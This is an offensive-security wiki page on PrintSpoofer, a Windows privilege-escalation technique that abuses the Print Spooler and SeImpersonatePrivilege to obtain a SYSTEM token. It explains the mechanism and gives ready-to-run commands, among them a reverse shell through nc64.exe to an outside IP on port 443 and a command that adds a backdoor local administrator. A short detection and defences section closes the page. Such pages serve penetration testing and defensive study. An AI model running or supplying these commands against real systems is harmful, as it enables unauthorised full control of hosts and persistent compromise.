# PrintSpoofer

PrintSpoofer (by itm4n) is the go-to modern potato for turning `SeImpersonatePrivilege` into `NT AUTHORITY\SYSTEM` on Windows 10 and Server 2016/2019. Where the older potatoes relied on DCOM/NTLM tricks that Microsoft progressively patched, PrintSpoofer abuses the **Print Spooler** service: it coerces the spooler (running as SYSTEM) to connect to an attacker-controlled named pipe, then impersonates the SYSTEM token that arrives. If a service account has `SeImpersonatePrivilege` — as `NETWORK SERVICE`, `LOCAL SERVICE`, and most IIS/MSSQL accounts do — this is usually an instant win.

## Requirements

- `SeImpersonatePrivilege` **enabled** (verify first).
- The **Print Spooler** service running (default on most builds).
- Windows 10 / Server 2016–2019 (before the 2021 spooler hardening).

```powershell
whoami /priv | findstr /i "SeImpersonate"
```

## How it works

1. PrintSpoofer creates a named pipe (`\\.\pipe\<name>`).
2. It uses the spooler's RPC interface (`RpcRemoteFindFirstPrinterChangeNotificationEx`) to make the SYSTEM spooler connect to that pipe.
3. On connection it calls `ImpersonateNamedPipeClient`, capturing the SYSTEM token.
4. It duplicates the token and spawns a process as SYSTEM.

## Exploitation

Interactive SYSTEM shell in the current console:

```cmd
PrintSpoofer64.exe -i -c cmd
```

Run a single command (e.g. add an admin) or catch a reverse shell:

```cmd
PrintSpoofer64.exe -c "C:\Windows\Temp\nc64.exe 10.10.14.7 443 -e cmd"
PrintSpoofer64.exe -c "net localgroup administrators pwn /add"
```

Confirm:

```cmd
whoami
:: -> nt authority\system
```

## Detection and defenses

- **Detection:** Sysmon Event ID 17/18 (named-pipe create/connect) with an unusual pipe name, spooler spawning `cmd.exe`/`powershell.exe` as SYSTEM, Event ID 4674 (privileged object operation).
- **Defenses:** remove `SeImpersonatePrivilege` from accounts that do not need it; **disable the Print Spooler** on servers that are not print servers; apply current patches.

## Related
- [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks.md) — folder hub and potato-family comparison table
- [RoguePotato](RoguePotato.md) — sibling for when the spooler is disabled or patched
- [God Potato](God-Potato.md) — universal potato across Windows 7–Server 2022
- [Token Privilege Abuse](../Token-Privilege-Abuse/Token-Privilege-Abuse.md) — the `SeImpersonatePrivilege` context this exploits
- [Services Exploitation](../Services-Exploitation/Services-Exploitation.md) — service accounts that commonly hold SeImpersonate
